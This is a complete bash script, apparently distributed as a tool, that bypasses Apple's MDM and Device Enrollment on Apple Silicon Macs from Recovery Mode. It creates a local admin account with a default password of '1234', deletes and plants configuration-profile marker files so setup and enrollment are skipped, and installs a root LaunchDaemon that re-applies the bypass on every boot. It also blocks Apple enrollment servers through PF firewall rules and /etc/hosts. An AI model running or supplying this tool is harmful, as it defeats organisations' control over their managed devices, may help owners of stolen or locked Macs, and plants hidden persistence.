#!/bin/bash
# ═══════════════════════════════════════════════════════════════
#  Combined MDM Bypass — Recovery Mode + Persistence
#  Apple Silicon + macOS 15 (Sequoia) compatible
#  Avoids SSV (Signed System Volume) issues
#
#  Run from: Recovery Mode Terminal
#  Usage:    bash /Volumes/<USB>/mdm-bypass-combined.sh
# ═══════════════════════════════════════════════════════════════

RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
CYN='\033[1;36m'
WHT='\033[1;37m'
NC='\033[0m'

error_exit() { echo -e "${RED}[ERROR] $1${NC}" >&2; exit 1; }
warn()       { echo -e "${YEL}[WARN]  $1${NC}"; }
ok()         { echo -e "${GRN}[OK]    $1${NC}"; }
info()       { echo -e "${BLU}[INFO]  $1${NC}"; }
step()       { echo -e "${WHT}[STEP]  $1${NC}"; }

MDM_DOMAINS=(
    "deviceenrollment.apple.com"
    "mdmenrollment.apple.com"
    "iprofiles.apple.com"
)

# ═══════════════════════════════════════════════════════════════
#  Volume Detection
# ═══════════════════════════════════════════════════════════════
detect_volumes() {
    info "Scanning mounted volumes..."

    SYSTEM_VOL=""
    DATA_VOL=""

    for vol in /Volumes/*; do
        [ -d "$vol" ] || continue
        local name
        name=$(basename "$vol")

        [[ "$name" =~ Data$ ]] && continue
        [[ "$name" =~ Recovery ]] && continue
        [[ "$name" == "Preboot" ]] && continue
        [[ "$name" == "VM" ]] && continue
        [[ "$name" == "Update" ]] && continue

        if [ -d "$vol/System" ] || [ -d "$vol/usr" ]; then
            SYSTEM_VOL="$name"
            break
        fi
    done

    if [ -z "$SYSTEM_VOL" ]; then
        echo ""
        warn "Auto-detect failed. Available volumes:"
        ls -1 /Volumes/ 2>/dev/null | while read -r v; do
            echo "    - $v"
        done
        echo ""
        read -p "Enter system volume name: " SYSTEM_VOL
        [ -z "$SYSTEM_VOL" ] && error_exit "No system volume specified"
    fi

    if [ -d "/Volumes/${SYSTEM_VOL} - Data" ]; then
        DATA_VOL="${SYSTEM_VOL} - Data"
    elif [ -d "/Volumes/Data" ]; then
        DATA_VOL="Data"
    else
        for vol in /Volumes/*Data*; do
            if [ -d "$vol" ]; then
                DATA_VOL=$(basename "$vol")
                break
            fi
        done
    fi

    if [ -z "$DATA_VOL" ]; then
        warn "Could not find data volume"
        read -p "Enter data volume name: " DATA_VOL
        [ -z "$DATA_VOL" ] && error_exit "No data volume specified"
    fi

    SYSTEM_PATH="/Volumes/$SYSTEM_VOL"
    DATA_PATH="/Volumes/$DATA_VOL"

    [ -d "$SYSTEM_PATH" ] || error_exit "System volume not found: $SYSTEM_PATH"
    [ -d "$DATA_PATH" ]   || error_exit "Data volume not found: $DATA_PATH"

    ok "System: $SYSTEM_VOL"
    ok "Data:   $DATA_VOL"
}

# ═══════════════════════════════════════════════════════════════
#  Phase 1: Create Admin User (Data Volume — SSV safe)
# ═══════════════════════════════════════════════════════════════
create_admin_user() {
    echo ""
    echo -e "${CYN}══════ Phase 1: Create Admin User ══════${NC}"

    DSCL_PATH="$DATA_PATH/private/var/db/dslocal/nodes/Default"
    [ -d "$DSCL_PATH" ] || error_exit "DSCL path not found: $DSCL_PATH"

    read -p "  Full Name   (default: Admin):  " REAL_NAME
    REAL_NAME="${REAL_NAME:-Admin}"

    while true; do
        read -p "  Username    (default: admin):  " USERNAME
        USERNAME="${USERNAME:-admin}"

        if ! [[ "$USERNAME" =~ ^[a-zA-Z_][a-zA-Z0-9_-]*$ ]]; then
            warn "Invalid username. Use letters, numbers, underscore, hyphen."
            continue
        fi
        if [ ${#USERNAME} -gt 31 ]; then
            warn "Username too long (max 31 chars)"
            continue
        fi
        break
    done

    while true; do
        read -p "  Password    (default: 1234):   " PASSWORD
        PASSWORD="${PASSWORD:-1234}"
        if [ ${#PASSWORD} -lt 4 ]; then
            warn "Password too short (min 4 chars)"
            continue
        fi
        break
    done

    # Find available UID
    UID_NUM=501
    while [ $UID_NUM -lt 600 ]; do
        if ! dscl -f "$DSCL_PATH" localhost -search /Local/Default/Users UniqueID $UID_NUM 2>/dev/null | grep -q "UniqueID"; then
            break
        fi
        UID_NUM=$((UID_NUM + 1))
    done
    info "Using UID: $UID_NUM"

    # Check if user exists
    if dscl -f "$DSCL_PATH" localhost -read "/Local/Default/Users/$USERNAME" 2>/dev/null | grep -q "RecordName"; then
        warn "User '$USERNAME' already exists — skipping creation"
    else
        dscl -f "$DSCL_PATH" localhost -create "/Local/Default/Users/$USERNAME" \
            || error_exit "Failed to create user"
        dscl -f "$DSCL_PATH" localhost -create "/Local/Default/Users/$USERNAME" UserShell "/bin/zsh"
        dscl -f "$DSCL_PATH" localhost -create "/Local/Default/Users/$USERNAME" RealName "$REAL_NAME"
        dscl -f "$DSCL_PATH" localhost -create "/Local/Default/Users/$USERNAME" UniqueID "$UID_NUM"
        dscl -f "$DSCL_PATH" localhost -create "/Local/Default/Users/$USERNAME" PrimaryGroupID "20"
        dscl -f "$DSCL_PATH" localhost -create "/Local/Default/Users/$USERNAME" NFSHomeDirectory "/Users/$USERNAME"
        dscl -f "$DSCL_PATH" localhost -passwd "/Local/Default/Users/$USERNAME" "$PASSWORD" \
            || error_exit "Failed to set password"
        dscl -f "$DSCL_PATH" localhost -append "/Local/Default/Groups/admin" GroupMembership "$USERNAME" \
            || error_exit "Failed to add to admin group"
        ok "User '$USERNAME' created"
    fi

    # Create home directory
    USER_HOME="$DATA_PATH/Users/$USERNAME"
    if [ ! -d "$USER_HOME" ]; then
        mkdir -p "$USER_HOME" && ok "Home directory created" || warn "Could not create home dir"
    fi
}

# ═══════════════════════════════════════════════════════════════
#  Phase 2: Bypass Markers (Data Volume — SSV safe)
# ═══════════════════════════════════════════════════════════════
set_bypass_markers() {
    echo ""
    echo -e "${CYN}══════ Phase 2: MDM Bypass Markers ══════${NC}"

    CONFIG_DIR="$DATA_PATH/private/var/db/ConfigurationProfiles/Settings"
    mkdir -p "$CONFIG_DIR" 2>/dev/null

    # Remove activation triggers
    rm -f "$CONFIG_DIR/.cloudConfigHasActivationRecord" 2>/dev/null \
        && ok "Removed .cloudConfigHasActivationRecord" \
        || info "No activation record found"

    rm -f "$CONFIG_DIR/.cloudConfigRecordFound" 2>/dev/null \
        && ok "Removed .cloudConfigRecordFound" \
        || info "No record found marker"

    # Create bypass markers
    touch "$CONFIG_DIR/.cloudConfigProfileInstalled" \
        && ok "Created .cloudConfigProfileInstalled" \
        || warn "Failed to create profile marker"

    touch "$CONFIG_DIR/.cloudConfigRecordNotFound" \
        && ok "Created .cloudConfigRecordNotFound" \
        || warn "Failed to create not-found marker"

    # Mark setup as done — skips Setup Assistant entirely
    touch "$DATA_PATH/private/var/db/.AppleSetupDone" \
        && ok "Created .AppleSetupDone" \
        || warn "Failed to mark setup done"
}

# ═══════════════════════════════════════════════════════════════
#  Phase 3: Persistence LaunchDaemon (Data Volume — SSV safe)
#  Re-applies bypass markers + blocks MDM via PF on every boot
# ═══════════════════════════════════════════════════════════════
install_persistence() {
    echo ""
    echo -e "${CYN}══════ Phase 3: Persistence (LaunchDaemon) ══════${NC}"

    DAEMON_DIR="$DATA_PATH/Library/LaunchDaemons"
    SCRIPT_DIR="$DATA_PATH/Library/Scripts"
    mkdir -p "$DAEMON_DIR" "$SCRIPT_DIR" 2>/dev/null

    # Build domain list for the script
    local domain_list=""
    for d in "${MDM_DOMAINS[@]}"; do
        domain_list="$domain_list \"$d\""
    done

    # Persistence script — runs at every boot
    cat > "$SCRIPT_DIR/mdm-bypass-persist.sh" << 'BOOTSCRIPT'
#!/bin/bash
# MDM Bypass Persistence — runs at boot
# Ensures bypass markers exist and blocks MDM domains via PF

MARKERS_DIR="/var/db/ConfigurationProfiles/Settings"
LOG="/var/log/mdm-bypass-persist.log"

log() { echo "$(date '+%Y-%m-%d %H:%M:%S') $1" >> "$LOG"; }

log "=== MDM Bypass Persistence Starting ==="

# Re-apply bypass markers if missing
mkdir -p "$MARKERS_DIR" 2>/dev/null

if [ ! -f "$MARKERS_DIR/.cloudConfigProfileInstalled" ]; then
    touch "$MARKERS_DIR/.cloudConfigProfileInstalled"
    log "Restored .cloudConfigProfileInstalled"
fi

if [ ! -f "$MARKERS_DIR/.cloudConfigRecordNotFound" ]; then
    touch "$MARKERS_DIR/.cloudConfigRecordNotFound"
    log "Restored .cloudConfigRecordNotFound"
fi

# Remove activation triggers if they reappear
if [ -f "$MARKERS_DIR/.cloudConfigHasActivationRecord" ]; then
    rm -f "$MARKERS_DIR/.cloudConfigHasActivationRecord"
    log "Removed .cloudConfigHasActivationRecord"
fi

if [ -f "$MARKERS_DIR/.cloudConfigRecordFound" ]; then
    rm -f "$MARKERS_DIR/.cloudConfigRecordFound"
    log "Removed .cloudConfigRecordFound"
fi

# Block MDM domains via PF firewall (IP-level blocking)
MDM_DOMAINS="deviceenrollment.apple.com mdmenrollment.apple.com iprofiles.apple.com"
PF_RULES=""

for domain in $MDM_DOMAINS; do
    ips=$(dig +short "$domain" 2>/dev/null | grep -E '^[0-9]+\.')
    for ip in $ips; do
        PF_RULES="${PF_RULES}block drop out quick proto tcp from any to ${ip}\n"
        log "Blocking IP: $ip ($domain)"
    done
done

if [ -n "$PF_RULES" ]; then
    echo -e "$PF_RULES" | pfctl -a com.apple/mdmblock -f - 2>/dev/null
    pfctl -e 2>/dev/null
    log "PF rules loaded"
fi

log "=== MDM Bypass Persistence Complete ==="
BOOTSCRIPT

    chmod 755 "$SCRIPT_DIR/mdm-bypass-persist.sh"
    ok "Persistence script installed"

    # LaunchDaemon plist — runs script at boot before login
    cat > "$DAEMON_DIR/com.mdmbypass.persist.plist" << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.mdmbypass.persist</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>/Library/Scripts/mdm-bypass-persist.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
    <key>StandardOutPath</key>
    <string>/var/log/mdm-bypass-persist.log</string>
    <key>StandardErrorPath</key>
    <string>/var/log/mdm-bypass-persist.log</string>
</dict>
</plist>
PLIST

    chmod 644 "$DAEMON_DIR/com.mdmbypass.persist.plist"
    chown root:wheel "$DAEMON_DIR/com.mdmbypass.persist.plist" 2>/dev/null
    ok "LaunchDaemon installed (runs at every boot)"
}

# ═══════════════════════════════════════════════════════════════
#  Phase 4: Try /etc/hosts (System Volume — may fail on SSV)
# ═══════════════════════════════════════════════════════════════
try_hosts_file() {
    echo ""
    echo -e "${CYN}══════ Phase 4: /etc/hosts (best-effort) ══════${NC}"

    HOSTS_FILE="$SYSTEM_PATH/etc/hosts"

    if [ ! -f "$HOSTS_FILE" ]; then
        warn "Hosts file not found at $HOSTS_FILE"
        info "Skipping — persistence layer (Phase 3) will handle blocking"
        return
    fi

    # Test if writable
    if ! touch "$HOSTS_FILE" 2>/dev/null; then
        warn "System volume is sealed (SSV) — cannot modify /etc/hosts"
        info "This is expected on Apple Silicon + macOS 11+"
        info "Persistence LaunchDaemon (Phase 3) handles blocking via PF firewall"
        return
    fi

    local modified=false
    for domain in "${MDM_DOMAINS[@]}"; do
        if ! grep -q "$domain" "$HOSTS_FILE" 2>/dev/null; then
            echo "0.0.0.0 $domain" >> "$HOSTS_FILE"
            ok "Blocked: $domain"
            modified=true
        else
            info "Already blocked: $domain"
        fi
    done

    if $modified; then
        ok "Hosts file updated"
    fi
}

# ═══════════════════════════════════════════════════════════════
#  Cleanup — remove all bypass modifications
# ═══════════════════════════════════════════════════════════════
cleanup() {
    echo ""
    echo -e "${CYN}══════ Removing MDM Bypass ══════${NC}"

    detect_volumes

    # Remove bypass markers
    CONFIG_DIR="$DATA_PATH/private/var/db/ConfigurationProfiles/Settings"
    rm -f "$CONFIG_DIR/.cloudConfigProfileInstalled" 2>/dev/null && ok "Removed .cloudConfigProfileInstalled"
    rm -f "$CONFIG_DIR/.cloudConfigRecordNotFound" 2>/dev/null && ok "Removed .cloudConfigRecordNotFound"

    # Remove persistence
    rm -f "$DATA_PATH/Library/LaunchDaemons/com.mdmbypass.persist.plist" 2>/dev/null && ok "Removed LaunchDaemon"
    rm -f "$DATA_PATH/Library/Scripts/mdm-bypass-persist.sh" 2>/dev/null && ok "Removed persistence script"

    # Remove .AppleSetupDone
    rm -f "$DATA_PATH/private/var/db/.AppleSetupDone" 2>/dev/null && ok "Removed .AppleSetupDone"

    # Remove hosts entries
    HOSTS_FILE="$SYSTEM_PATH/etc/hosts"
    if [ -f "$HOSTS_FILE" ]; then
        for domain in "${MDM_DOMAINS[@]}"; do
            sed -i '' "/0.0.0.0 $domain/d" "$HOSTS_FILE" 2>/dev/null
        done
        ok "Cleaned hosts file"
    fi

    echo ""
    ok "All bypass modifications removed"
    info "Note: admin user was NOT removed — delete manually if needed"
}

# ═══════════════════════════════════════════════════════════════
#  Usage
# ═══════════════════════════════════════════════════════════════
usage() {
    echo ""
    echo -e "${WHT}Usage:${NC}"
    echo "  bash $0 bypass     Full MDM bypass (default)"
    echo "  bash $0 cleanup    Remove all bypass modifications"
    echo ""
    echo -e "${WHT}How it works:${NC}"
    echo "  Phase 1: Create admin user (Data volume — SSV safe)"
    echo "  Phase 2: Set bypass markers (Data volume — SSV safe)"
    echo "  Phase 3: Install boot persistence (Data volume — SSV safe)"
    echo "  Phase 4: Try /etc/hosts (System volume — best effort)"
    echo ""
    echo -e "${WHT}Requirements:${NC}"
    echo "  - Run from Recovery Mode Terminal"
    echo "  - macOS must be installed on the target disk"
    echo ""
    echo -e "${WHT}Recommended workflow:${NC}"
    echo "  1. DFU restore the target Mac"
    echo "  2. Boot to Recovery Mode (hold power button)"
    echo "  3. Open Terminal from Utilities menu"
    echo "  4. Run this script from USB or mount point"
    echo "  5. Reboot and login with the admin account"
}

# ═══════════════════════════════════════════════════════════════
#  Main
# ═══════════════════════════════════════════════════════════════

echo ""
echo -e "${CYN}╔═══════════════════════════════════════════════════╗${NC}"
echo -e "${CYN}║   Combined MDM Bypass — Recovery + Persistence   ║${NC}"
echo -e "${CYN}║   Apple Silicon + SSV Compatible                 ║${NC}"
echo -e "${CYN}╚═══════════════════════════════════════════════════╝${NC}"
echo ""

case "${1:-bypass}" in
    bypass|setup)
        detect_volumes
        create_admin_user
        set_bypass_markers
        install_persistence
        try_hosts_file

        echo ""
        echo -e "${GRN}╔═══════════════════════════════════════════════════╗${NC}"
        echo -e "${GRN}║          MDM Bypass Complete                     ║${NC}"
        echo -e "${GRN}╠═══════════════════════════════════════════════════╣${NC}"
        echo -e "${GRN}║${NC}  Username:  ${WHT}$USERNAME${NC}"
        echo -e "${GRN}║${NC}  Password:  ${WHT}$PASSWORD${NC}"
        echo -e "${GRN}╠═══════════════════════════════════════════════════╣${NC}"
        echo -e "${GRN}║${NC}  ${YEL}Layers applied:${NC}"
        echo -e "${GRN}║${NC}    1. Admin user            (Data vol)  ${GRN}✓${NC}"
        echo -e "${GRN}║${NC}    2. Bypass markers         (Data vol)  ${GRN}✓${NC}"
        echo -e "${GRN}║${NC}    3. Boot persistence       (Data vol)  ${GRN}✓${NC}"
        echo -e "${GRN}║${NC}    4. /etc/hosts             (best effort)${NC}"
        echo -e "${GRN}╠═══════════════════════════════════════════════════╣${NC}"
        echo -e "${GRN}║${NC}  ${CYN}Next steps:${NC}"
        echo -e "${GRN}║${NC}    1. Close Terminal"
        echo -e "${GRN}║${NC}    2. Reboot (Apple menu → Restart)"
        echo -e "${GRN}║${NC}    3. Login with the account above"
        echo -e "${GRN}║${NC}    4. If MDM prompt appears during setup:"
        echo -e "${GRN}║${NC}       connect to sinkhole Wi-Fi network"
        echo -e "${GRN}╚═══════════════════════════════════════════════════╝${NC}"
        echo ""
        ;;
    cleanup|remove)
        cleanup
        ;;
    *)
        usage
        ;;
esac
